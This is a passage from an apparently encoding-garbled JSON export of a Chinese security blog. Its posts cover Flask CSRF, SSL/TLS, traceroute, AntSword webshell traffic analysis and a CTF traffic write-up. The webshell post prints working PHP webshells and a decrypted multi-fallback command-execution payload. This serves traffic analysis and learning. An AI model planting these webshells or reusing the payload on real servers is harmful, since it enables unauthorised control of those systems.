¼å¼åŒ–å­—ç¬¦ä¸²çš„å½¢å¼ï¼›å¦‚æœå¿…é¡»ä½¿ç”¨çš„è¯ï¼Œè¦å»ºç«‹ç›¸å¯¹å¼ºçš„è¿‡æ»¤è§„åˆ™ï¼Œå°¤å…¶æ˜¯å¯¹å°æ‹¬å·çš„è¿‡æ»¤ï¼Œè¿‡æ»¤å°æ‹¬å·åå°±å¾ˆéš¾æ‰§è¡Œå‘½ä»¤äº†ã€‚å¯¹äºå…³é”®è¯è¿‡æ»¤ï¼Œæˆ‘çš„æ€è·¯æ˜¯è¿›è¡Œé¢„å¤„ç†ï¼Œå°†æ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²ä¸­çš„å¼•å·ï¼ŒåŠ å·ç­‰ç‰¹æ®Šç¬¦å·æ­£åˆ™åŒ¹é…å»æ‰åå†è¿›è¡Œé»‘åå•åŒ¹é…ã€‚ flask csrfåˆ†æå¼€å£å°±æ˜¯è€csrfäº†ï¼Œå…ˆåˆ†æåˆ†ææºç é¦–å…ˆ 1CSRFProtect(app) ï¼Œè·Ÿè¿›CSRFProtect ç„¶åæœ‰ä¸€ä¸ªapp.before_requestä¿®é¥°çš„æ–¹æ³•ï¼Œè¯´æ˜åœ¨è¯·æ±‚å‰æ‰§è¡Œã€‚ è¯¥æ–¹æ³•è¿›è¡Œ 1self.protect() è·Ÿè¿›self.protect() ä½¿ç”¨æ–¹æ³•validate_csrfå°è¯•éªŒè¯tokençš„æ­£ç¡®æ€§ï¼Œtokenä¸ºself._get_csrf_token å…¶å®å¯¹URLSafeTimedSerializerè¿™ä¸ªæˆ‘ä¸æ˜¯å¤ªç†Ÿæ‚‰ï¼Œæˆ‘å¯¹ä»–çš„ç†è§£æ˜¯äº§ç”Ÿä¸€ä¸ªsessionï¼ŒsessionåŒ…æ‹¬ä¸‰ä¸ªå­—æ®µï¼Œbase64åŠ å¯†çš„æ•°æ®å­—æ®µï¼Œtimestampï¼Œç­¾åã€‚ç„¶åäº§ç”Ÿçš„tokenå°±æ˜¯è·å–åºåˆ—åŒ–åçš„sessionçš„æ•°æ®å­—æ®µçš„ 1session[field_name] ä¸­çš„æ•°æ®ã€‚ ç”Ÿå‘½æµç¨‹ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œäº§ç”Ÿsessionä¸tokenï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´ç¬¬äºŒæ¬¡åŒ…æ‹¬ä»¥åçš„è®¿é—®åœ¨å¤´éƒ¨æˆ–è€…è¡¨å•ä¸­æºå¸¦tokenï¼Œè®¿é—®å‰è¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯é€šè¿‡åˆ™å…è®¸è®¿é—®ã€‚é™¤äº†tokenå¤–è¿˜æœ‰è¯·æ±‚å¤´ï¼ŒåŒæºç­–ç•¥ç­‰éªŒè¯ CSRFé˜²æŠ¤å°±flaskçš„csrfé˜²æŠ¤æ–¹æ³•è€Œè¨€ï¼Œä¸»è¦æ˜¯é˜²æ­¢hackeræ‹¿åˆ°tokenï¼Œä¸»è¦éœ€è¦é˜²èŒƒxssï¼Œæ¯”å¦‚ä¸Šè¿°æåˆ°çš„sstiä¼šå¯¼è‡´xssã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"SSL&TLS","slug":"SSL-TLS","date":"2020-05-01T10:27:41.000Z","updated":"2020-05-01T11:08:45.615Z","comments":true,"path":"2020/05/01/SSL-TLS/","link":"","permalink":"https://polosec.github.io/2020/05/01/SSL-TLS/","excerpt":"","text":"æœ€è¿‘å¤ä¹ è®¡ç®—æœºç½‘ç»œçœ‹åˆ°äº†è®¡ç®—æœºç½‘ç»œå®‰å…¨é‚£ä¸€ç« ï¼Œå¯¹SSL TLS è¯ä¹¦ç­‰å†…å®¹æœ‰äº†åˆæ­¥ç†è§£ï¼Œè¿™é‡Œåšä¸€ä¸ªè®°å½•ã€‚å‚è€ƒé“¾æ¥ï¼šhttp://www.ruanyifeng.com/blog/2014/09/illustration-ssl.htmlhttps://segmentfault.com/a/1190000002554673https://kb.cnblogs.com/page/197396/https://www.cnblogs.com/handsomeBoys/p/6556336.html è¯ä¹¦CAæ˜¯è¯ä¹¦æˆæƒä¸­å¿ƒï¼Œç®€å•è¯´å°±æ˜¯ç­¾å‘è¯ä¹¦çš„æœºæ„ã€‚è¯ä¹¦ç­¾å‘æµç¨‹ï¼šæœåŠ¡ç«¯å‘CAæäº¤å…¬é’¥ï¼Œç»„ç»‡ä¿¡æ¯ï¼ŒåŸŸåç­‰å†…å®¹CAå®¡æ ¸é€šè¿‡åç­¾å‘è¯ä¹¦ï¼Œè¯ä¹¦åŒ…æ‹¬äº†ï¼šç”³è¯·è€…å…¬é’¥ï¼Œç”³è¯·è€…ä¿¡æ¯ã€åŸŸåã€æœ‰æ•ˆæ—¶é—´ã€åºåˆ—å·ç­‰å†…å®¹ï¼Œè¿˜æœ‰ä¸€ä¸ªæ•°å­—ç­¾åï¼šCAç”¨CAè‡ªå·±çš„ç§é’¥å¯¹ç”³è¯·è€…æ‰€æœ‰ä¿¡æ¯ç”Ÿæˆçš„æ‘˜è¦è¿›è¡ŒåŠ å¯†ã€‚ç®€å•æ¥è¯´ï¼Œè¯ä¹¦=ç”³è¯·è€…å…¬é’¥+CAç­¾å+ç”³è¯·è€…ä¿¡æ¯ httpsè¯·æ±‚è¿‡ç¨‹1.å®¢æˆ·ç«¯å‘æœåŠ¡å™¨443ç«¯å£å‘é€è¯·æ±‚2.æœåŠ¡å™¨è¿”å›è¯ä¹¦3.å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦æœ‰æ•ˆæ€§ï¼Œå¹¶ä¸”äº§ç”Ÿä¸€éšæœºå€¼ï¼Œé€šè¿‡æœåŠ¡å™¨å…¬é’¥åŠ å¯†ã€‚4.æœåŠ¡å™¨æ”¶åˆ°åŠ å¯†åçš„éšæœºå€¼åï¼Œç”¨ç§é’¥è§£å¯†ï¼Œæ¥ä¸‹æ¥åŒæ–¹ä¼ è¾“çš„å†…å®¹éƒ½ç”¨è¯¥éšæœºå€¼åŠ å¯†ã€‚ SSL/TLSé€šä¿¡è¿‡ç¨‹ï¼š1.å®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå£°æ˜è‡ªå·±çš„åŠ å¯†æ–¹å¼ï¼Œå¹¶ä¸”å‘é€ä¸€ä¸ªéšæœºæ•°2.æœåŠ¡å™¨è¿”å›è¯ä¹¦ï¼Œç¡®å®šä½¿ç”¨çš„åŠ å¯†æ–¹å¼ï¼Œå‘é€ä¸€ä¸ªéšæœºæ•°3.å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦æœ‰æ•ˆæ€§ï¼ŒéªŒè¯é€šè¿‡åï¼Œäº§ç”Ÿä¸€ä¸ªéšæœºæ•°ï¼Œé€šè¿‡æœåŠ¡å™¨å…¬é’¥è¿›è¡ŒåŠ å¯†ï¼Œä½œä¸ºpremaster keyå‘é€ç»™æœåŠ¡å™¨ã€‚4.æœåŠ¡å™¨æ¥å—åˆ°åŠ å¯†åçš„éšæœºæ•°åè§£å¯†5.å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨æ ¹æ®ç›¸åŒçš„ç®—æ³•ï¼Œé€šè¿‡ä¸¤ä¸ªæœªåŠ å¯†çš„éšæœºæ•°ä¸ç¬¬ä¸‰ä¸ªéšæœºæ•°äº§ç”Ÿsession key6.æœåŠ¡å™¨ä½¿ç”¨session keyå‘é€ä¸€ä¸ªæ•°æ®ï¼ŒéªŒè¯è¿æ¥æ˜¯å¦æˆåŠŸå»ºç«‹ã€‚7.ä»¥åå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„é€šè®¯ä½¿ç”¨session keyåŠ å¯†ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰","categories":[],"tags":[{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://polosec.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"ping&tracert","slug":"ICMP-tracert","date":"2020-05-01T10:14:22.000Z","updated":"2020-05-01T10:35:50.754Z","comments":true,"path":"2020/05/01/ICMP-tracert/","link":"","permalink":"https://polosec.github.io/2020/05/01/ICMP-tracert/","excerpt":"","text":"pingpingå‘½ä»¤ç”¨çš„æ˜¯ICMPå›é€è¯·æ±‚ä¸å›ç­”ï¼Œå¦‚æœpingä¸€ä¸ªå­˜åœ¨çš„ä¸»æœºçš„è¯ï¼Œåœ¨ä¸ç¦æ­¢pingçš„å‰æä¸‹ä¼šå‘ä¸€ä¸ªICMPå›é€å›ç­”ï¼Œä¸»æœºè®¡ç®—RTTï¼Œå¹³å‡RTTä¸TTLã€‚ tracert/tracerouteåˆ©ç”¨çš„æ˜¯pingå‘½ä»¤ï¼ŒæŠŠttlä»1å¾€ä¸ŠåŠ ï¼Œå½“è·¯ç”±å™¨æ”¶åˆ°ttlä¸º1çš„æ•°æ®åŒ…å-1å˜æˆ0ï¼Œä¼šç»™æºç«™å‘ä¸€ä¸ªè¶…æ—¶ï¼Œä½†æ˜¯å­˜åœ¨çš„é—®é¢˜æ˜¯å¦‚æœè¯¥è·¯ç”±å™¨å¯¹è¶…æ—¶ä¸å¤„ç†çš„è¯ï¼Œåœ¨æºç«™çœ‹åˆ°çš„èŠ‚ç‚¹å°±å˜æˆäº†*ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æŸäº›è·¯ç”±å™¨å¯¹tracertå‘½ä»¤ä¸å¯è§ã€‚","categories":[],"tags":[{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://polosec.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"èšå‰‘æµé‡åˆ†æ&webshell","slug":"èšå‰‘æµé‡åˆ†æ-webshell","date":"2020-04-30T02:53:51.000Z","updated":"2020-04-30T08:29:13.455Z","comments":true,"path":"2020/04/30/èšå‰‘æµé‡åˆ†æ-webshell/","link":"","permalink":"https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/","excerpt":"","text":"webshellç†è§£webshellçš„æœ¬è´¨æ˜¯ä¼ å…¥å‘½ä»¤å¹¶ä¸”æ‰§è¡Œã€‚å¸¸è§çš„php webshell 1&lt;?php eval($_POST[&#x27;cmd&#x27;];?&gt;) shell.phpè®¿é—®shell.phpçš„æ—¶å€™postä¸€ä¸ªå‚æ•°cmd,å¦‚æœä¼ å…¥çš„æ˜¯cmd=system(â€œwhoamiâ€)çš„è¯å°±ä¼šæ‰§è¡Œwhoamiã€‚webshellç›¸å½“äºç½‘ç«™ç®¡ç†åŠŸèƒ½ï¼Œæä¾›åˆ—ç›®å½•ï¼Œä¿®æ”¹æ–‡ä»¶ï¼Œè™šæ‹Ÿç»ˆç«¯ç­‰æ“ä½œï¼Œè¿™äº›å¯è§†åŒ–æ“ä½œçš„èƒŒåå…¶å®æ˜¯ä¸€æ¡æ¡PHPè¯­å¥å†™çš„ï¼Œç„¶åé€åˆ°æœåŠ¡å™¨æ‰§è¡Œï¼Œç„¶åæ ¹æ®è¿”å›ç»“æœå¯è§†åŒ–åˆ°ç®¡ç†ç»ˆç«¯ã€‚shellä¸wafä¸€ç›´åœ¨å‡çº§ï¼Œè¡ç”Ÿå‡ºäº†å„ç§æ··æ·†æ–¹æ³•ã€‚å½“ç„¶ï¼Œwafä¹Ÿåœ¨æŠ“ç‰¹å¾æµé‡è¿›è¡Œæ‹¦æˆªã€‚ èšå‰‘æµé‡åˆ†æä»Šå¤©åˆ†æçš„æ˜¯æ˜¨å¤©æ²¡çœ‹å®Œçš„èšå‰‘æµé‡ã€‚å‘é€æ•°æ®é‡‡ç”¨RSAåŠ å¯†ï¼ŒæœåŠ¡å™¨è¿”å›æ•°æ®é‡‡ç”¨AESåŠ å¯†ã€‚shellï¼š 12345678910111213141516171819&lt;?php$cmd = @$_POST[&#x27;ant&#x27;];$pk = &lt;&lt;&lt;EOF-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCd3U6xkZFNwFKSRlRa+Jsdy0/Erkpoq9A/Xl58TfOL5ghxaQh91zWriwpsMVMdjkORzTNM0yrKoyF2+LjxzE2wW6Qt/NC6dQgUKQQJk9ypgq4Po9ypxxI8AdtthKSelijpqD5YsXZYSFGCyLNaC33+pVp2wQUED9OTJg9AuXIG4QIDAQAB-----END PUBLIC KEY-----EOF;$cmds = explode(&quot;|&quot;, $cmd);$pk = openssl_pkey_get_public($pk);$cmd = &#x27;&#x27;;foreach ($cmds as $value) &#123; if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123; $cmd .= $de; &#125;&#125;eval($cmd); é¦–å…ˆæ¨¡æ‹Ÿä¸€æ¬¡è¿‡ç¨‹ï¼šå¯åŠ¨è™šæ‹Ÿç»ˆç«¯å¹¶è¾“å…¥whoamiæŸ¥è¯¢ã€‚ åœ¨wiresharkæŠ“åˆ°æ•°æ®åŒ…ï¼š è¿½è¸ªHTTPæµé‡ï¼š å¯¹å‘é€çš„æ•°æ®è¿›è¡Œè¿˜åŸä½¿ç”¨ç§é’¥åŠ å¯†çš„æ•°æ®ç”¨å…¬é’¥è§£å¯†ã€‚è§£å¯†åæ•°æ®ï¼š 1234567891011121314151617181920212223242526272829&lt;?php ant=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;@session_start();$key=@substr(str_pad(session_id(),16,&#x27;a&#x27;),0,16);return @base64_encode(openssl_encrypt(base64_encode($out), &#x27;AES-128-ECB&#x27;, $key, OPENSSL_RAW_DATA));&#125;;//é‡‡ç”¨AESåŠ å¯†è¾“å‡ºï¼Œkeyä¸ºsessionå‰16ä½ã€‚function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;3c5e3e9640&quot;;echo @asenc($output);echo &quot;cda10a9ad&quot;;&#125;//è¾“å‡ºå†…å®¹ob_start();try&#123;$p=base64_decode($_POST[&quot;kba6818a1ddd35&quot;]);$s=base64_decode($_POST[&quot;med28329bbe5b9&quot;]);$envstr=@base64_decode($_POST[&quot;v610da0caba97e&quot;]);$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);//è·å–ä¸‹é¢postçš„å‚æ•°ï¼Œåˆ†åˆ«æ˜¯cmdå’Œwhoamiã€‚$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;)&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);&#125;else&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);&#125;if(!empty($envstr))&#123;$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) &#123;if (!empty($v)) &#123;@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));&#125;&#125;&#125;//åˆ¤æ–­æ˜¯Linuxè¿˜æ˜¯Windows$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;//æ‹¼æ¥å‘½ä»¤function fe($f)&#123;$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d))&#123;$d=array();&#125;else&#123;$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));&#125;return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));&#125;;function runshellshock($d, $c) &#123;if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe(&#x27;error_log&#x27;)) &#123;error_log(&quot;a&quot;, 1);&#125; else &#123;mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);&#125;&#125; else &#123;return False;&#125;$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) &#123;print($output);return True;&#125;&#125;return False;&#125;;function runcmd($c)&#123;$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe(&#x27;system&#x27;))&#123;@system($c,$ret);&#125;elseif(fe(&#x27;passthru&#x27;))&#123;@passthru($c,$ret);&#125;elseif(fe(&#x27;shell_exec&#x27;))&#123;print(@shell_exec($c));&#125;elseif(fe(&#x27;exec&#x27;))&#123;@exec($c,$o,$ret);print(join(&quot;&quot;,$o));&#125;elseif(fe(&#x27;popen&#x27;))&#123;$fp=@popen($c,&#x27;r&#x27;);while(!@feof($fp))&#123;print(@fgets($fp,2048));&#125;@pclose($fp);&#125;elseif(fe(&#x27;proc_open&#x27;))&#123;$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);while(!@feof($io[1]))&#123;print(@fgets($io[1],2048));&#125;while(!@feof($io[2]))&#123;print(@fgets($io[2],2048));&#125;@fclose($io[1]);@fclose($io[2]);@proc_close($p);&#125;elseif(fe(&#x27;antsystem&#x27;))&#123;@antsystem($c);&#125;elseif(runshellshock($d, $c)) &#123;return $ret;&#125;elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;))&#123;$w=new COM(&#x27;WScript.shell&#x27;);$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);&#125;else&#123;$ret = 127;&#125;return $ret;&#125;;//å‘½ä»¤æ‰§è¡Œå‡½æ•°$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);//å‘½ä»¤æ‰§è¡Œå¹¶ä¸”stderré‡å®šå‘åˆ°stdoutprint ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();//æ‰§è¡Œå…¥å£die();//è¿™é‡Œæ˜¯postçš„æ•°æ®ï¼Œå¯¹åº”ä¸Šé¢çš„med28329bbe5b9å’Œkba6818a1ddd35ã€‚ã€‚ã€‚&amp;kba6818a1ddd35=Y21k&amp;med28329bbe5b9=Y2QgL2QgIkU6XFxwaHBzdHVkeV9wcm9cXFdXV1xcdGVzdC5pbyImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd&amp;v610da0caba97e=?&gt; å…·ä½“çš„æ“ä½œå†™åœ¨ä¸Šæ–¹æ³¨é‡Šé‡Œäº†ï¼Œæ¯”è¾ƒæ¸…æ¥šã€‚ å®æˆ˜æ¥ä¸‹æ¥å¯åŠ¨è™šæ‹Ÿç»ˆç«¯ï¼Œä¼ å…¥whoami ï¼Œå¹¶ä¸”æ‰§è¡Œï¼ŒæŸ¥çœ‹æ•°æ®åŒ…ã€‚ è¿”å›æ•°æ®è§£å¯†å®¢æˆ·ç«¯æ”¶åˆ°æ•°æ®åä¼šç”¨çº¦å®šçš„keyè¿›è¡Œè§£å¯†ã€‚è¿”å›æ•°æ®ï¼šæ³¨æ„ï¼šè¿”å›çš„æ•°æ®é‡Œé¢å¹¶ä¸å…¨æ˜¯æœ‰æ•ˆåŠ å¯†å†…å®¹ï¼Œå‰åå­˜åœ¨ä¸¤ç«¯å¹²æ‰°æ•°æ®ï¼Œå¯ä»¥åœ¨ ä»£ç ä¸­çœ‹åˆ°åˆ†åˆ«æ˜¯3c5e3e9640å’Œcda10a9adã€‚ä¸­é—´çš„æ•°æ®æ‰æ˜¯çœŸæ­£æœ‰ç”¨çš„æ•°æ®ã€‚é¦–å…ˆå¯¹ä¸­é—´çš„æ•°æ®base64è§£å¯†ä¸€æ¬¡ï¼Œç„¶åä½¿ç”¨AES-128-ECBè§£å¯†ã€‚keyä¸ºsessionå‰16ä½ï¼šsubstr(sessionid,0,16);ã€‚è§£å¯†æ–¹æ³•ï¼šopenssl_decrypt($payload, â€˜AES-128-ECBâ€™, $key,OPENSSL_RAW_DATA)è§£å¯†åæ•°æ®ï¼šZGVza3RvcC00dTgxYjg1XDY5MDI3DQpbU10NCkU6XHBocHN0dWR5X3Byb1xXV1dcdGVzdC5pbw0KW0VdIA0Kç„¶åè¿›è¡Œbase64è§£å¯†ã€‚è§£å¯†åçš„æ•°æ®ï¼šdesktop-4u81b85\\69027[S]E:\\phpstudy_pro\\WWW\\test.io[E]å°±æ˜¯æ‰§è¡Œwhoamiçš„ç»“æœã€‚ æ€»ç»“èšå‰‘æµé‡åˆ†æç®—æ˜¯çœ‹äº†ä¸€å¤©ï¼Œå¾—ç›Šäºå‰æœŸå¯¹AESå’ŒRSAçš„åŸºç¡€çŸ¥è¯†ï¼Œä»¥è‡³äºä¸éœ€è¦å…ˆçœ‹RSAå’Œaesã€‚ã€‚2333åœ¨å¯¹shellå’Œå‘é€çš„ä»£ç è¿›è¡Œåˆ†æçš„æ—¶å€™è¿˜æ˜¯é‡åˆ°äº†ä¸€ç‚¹å›°éš¾ï¼Œæœ‰äº›åœ°æ–¹åªæ˜¯å¤§ä½“æ˜ç™½äº†ä»€ä¹ˆæ„æ€ï¼Œæ¯”å¦‚è¯†åˆ«æ˜¯Linuxè¿˜æ˜¯Windowsï¼Œä½†æ˜¯ç»†è®²æ¯ä¸€ä¸ªå‡½æ•°çš„åŠŸèƒ½æˆ‘è¿˜æ˜¯ä¸çŸ¥é“çš„ã€‚å¯¹æ­¤æˆ‘çš„æ€è·¯æ˜¯æ—¢ç„¶ç›®æ ‡æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œé‚£ä¹ˆå°±æŠŠåº•å±‚çš„å®ç°ç¨å¾®æŠ½è±¡ä¸€ç‚¹ï¼Œä¸å½±å“åç»­åˆ†æã€‚åˆ†ææµé‡è¿˜æ˜¯ä¸€ä»¶éå¸¸æœ‰æ„æ€çš„äº‹æƒ…ï¼Œè™½ç„¶æˆ‘æ²¡æœ‰æœºä¼šæ‰“AWDï¼Œbut I love AWD forever!!!!!!!","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"å®‰æ’æœˆèµ›æµé‡åˆ†æ","slug":"å®‰æ’æœˆèµ›æµé‡åˆ†æ","date":"2020-04-28T14:36:49.000Z","updated":"2020-04-30T07:37:18.180Z","comments":true,"path":"2020/04/28/å®‰æ’æœˆèµ›æµé‡åˆ†æ/","link":"","permalink":"https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"ç»è¿‡ä¸€ä¸‹åˆçš„å¥‹æˆ˜ï¼Œå¼„æ˜ç™½äº†awdshellè¿™é“é¢˜ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€è·¯å‚è€ƒé“¾æ¥ï¼šhttps://xz.aliyun.com/t/6701https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483852&amp;idx=1&amp;sn=3cd3f667523550d414fad97231eeeaea&amp;chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778022447&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rdç”¨åˆ°çš„çŸ¥è¯†ï¼šPHP OPENSSLï¼ŒwiresharkæŠ“æœ¬åœ°åŒ…ï¼ˆnpcapï¼‰ï¼ŒAESï¼Œwiresharkæµé‡åˆ†æã€è¿‡æ»¤è¯­æ³•ã€èšå‰‘RSA è§£é¢˜è¿‡ç¨‹å¯¼å‡ºHTTPå¯¹è±¡é¦–å…ˆå¸¸è§„æ“ä½œå°±æ˜¯å¯¼å‡ºhttpå¯¹è±¡ï¼Œå‘ç°æœ‰ä¸ªupload.phpï¼Œå‘ç°ä¼ äº†ä¸ªä¸è®¤è¯†çš„é©¬ï¼Œå†™äº†å…¬é’¥ï¼Œè€ƒè™‘RSAåŠ å¯†ã€‚ å¯ä»¥ç¡®å®šï¼Œä¼ äº†ä¸ªé©¬ï¼Œæ€è·¯çš„é‡ç‚¹åº”è¯¥å‘ä¸é©¬çš„äº¤äº’ä¸Šè€ƒè™‘ã€‚ æµé‡åˆ†æé€šè¿‡è¿‡æ»¤æ•°æ®åŒ…ï¼Œç¡®å®šäº†ä¸Šä¼ åçš„æ–‡ä»¶å‘½åä¸º1581335771.phpï¼Œäºæ˜¯åœ¨æ•°æ®åŒ…ä¸­é‡ç‚¹è§‚å¯Ÿä¸è¯¥æ–‡ä»¶çš„äº¤äº’ã€‚ä½¿ç”¨è¿‡æ»¤å™¨ï¼Œè¯­æ³•ï¼šhttp and ip.dst==139.224.112.182 and http.request.method==POST æŒ‰ä¸ªè¿½è¸ªHTTPæ•°æ®æµçœ‹çœ‹å‘—ï¼Œçœ‹çœ‹æœ‰å•¥æœ‰ç”¨çš„ä¿¡æ¯æ²¡ã€‚è¿½è¸ª29543åŒ…çš„æ—¶å€™ï¼Œå‘ç°äº†å­—ç¬¦ä¸²L3Zhci93d3cvaHRtbC9hZG1pbi91cGxvYWQvï¼Œå¯èƒ½æ˜¯base64ï¼Œè§£ä¸€ä¸‹å‘ç°æ˜¯/var/www/html/admin/upload/ï¼Œåº”è¯¥æ˜¯æ–‡ä»¶çš„ä¸Šä¼ è·¯å¾„ã€‚å‰©ä¸‹çš„HTTPæµæŒ¨ä¸ªè¿½è¸ªï¼Œè¿”å›çš„æ•°æ®éƒ½æ˜¯åŠ å¯†åçš„ï¼Œè¿”å›æ•°æ®æš‚æ—¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ã€‚äºæ˜¯ç»§ç»­æ³¨æ„å‘é€çš„æ•°æ®ã€‚åœ¨è¿½è¸ªå€’æ•°ç¬¬äºŒä¸ªHTTPæµçš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€äº›è››ä¸é©¬è¿¹ã€‚å‘é€çš„æ•°æ®é‚£æœ‰Y2QgIi92YXIvd3d3L2h0bWwvYWRtaW4vdXBsb2FkIjtjYXQgZmxhZztlY2hvIFtTXTtwd2Q7ZWNobyBbRV0=ï¼Œç»è§£å¯†åå‘ç°æ˜¯cd â€œ/var/www/html/admin/uploadâ€;cat flag;echo [S];pwd;echo [E]ï¼Œè¿™é‡Œå¯èƒ½è—äº†flagã€‚æ‰€ä»¥åº”è¯¥å¯¹è¯¥æ•°æ®åŒ…å‘é€çš„æ•°æ®è¿›è¡Œè¿˜åŸã€‚ æµé‡è¿˜åŸç”±äºå¯¼å‡ºHTPå¯¹è±¡çš„æ—¶å€™æœ‰ä¸ªå…¬é’¥ï¼Œè€ƒè™‘éå¯¹ç§°åŠ å¯†ï¼ˆRSAï¼‰ï¼Œç»“åˆé¢˜ç›®ç»™çš„å…³é”®å­—antä¸ç»™å‡ºçš„shellçš„æ ¼å¼ï¼Œå¯ä»¥ç¡®å®šè¿™æ˜¯ç”¨èšå‰‘è¿çš„shellï¼Œå¹¶ä¸”å‘é€æ•°æ®ç»è¿‡äº†RSAåŠ å¯†ã€‚å¯ä»¥å†™ä¸ªè„šæœ¬æŠŠå‘é€çš„æ•°æ®è¿˜åŸå‡ºæ¥ã€‚ 1234567891011121314151617181920&lt;?php$ant=&quot;GmFJzJHcsMOZxeGvb3Ulf4Y8e5RRhttAV1bsfypbvQAJW8IRFcqDVoXtyiclZwz2qXdQN8ivFYNqNxhkwtjbB7OitVLgULBfWlOnwtufxvmbmO4u8WlINbPbf/DbAy0Qx3GjBMFpFzrCkKINOfWQ5JqSD1EPx6sM9Cu1VkX5nus=|nL6Ds9dWn+UW5Jb0JAhoTb4rqPJJKbgcPNJfXLP1AKPbWHVE0JFSjClsnXWmFPXfeqPdKqcYxb/14hEwFzs51N5f6+NowrGHjYT+ObPKXpYxzg0vkCMihUMA7DI2YPUWEyPdvoIFg/bW5S3MommwKN9epOto55dtq6Pnb8NEHzY=|S4ic8EaKa3zEkRd7qsTGDs7uf3qiU1UVZE4fheQz3iq1HkiY6rIvAdtvcmsBF5aJWjdA/U2py1Mz105F2Tzm4dDX2Ag/rhX4ysiP8NJDEp+I55R0dfJu6szTOr3O2OTaUQK7iSYT4PKHjdo+rgeHK3hWzzMFAs6i2R9E81vz9WE=|FNCwxF7bDPNgizk4oa7bq4xbIObNCZNYNBdrTLMbYegWZ6FVYi54TLuABR/nkDLXq38cT099hjajM4iY+VL4g8tBRP++4LyPcSyzyC6mDtshAlmQtFteq4sGb+3IilDPekURxQ5RodRGBPtHr+nCNICbgmbqNaYKcVJRfMoK3q8=|m+nGWL1bOFJzaYeT54FtW12U3dWPZk5PJa91+YTtLn9Wg1c8JEf0FzI+YlBtpp6pW0fT7FfbTiJhQsv3f97bb3d+Cs7A5dM/ZG5YXDoDHGhRJKw0+TTHRIm3PH4fnbQNI8zhi5+9t2+0ueujAuXkk8i73A4lH36uKJFloL6yqs8=|YsyuPkbRlpDWwjhlkTT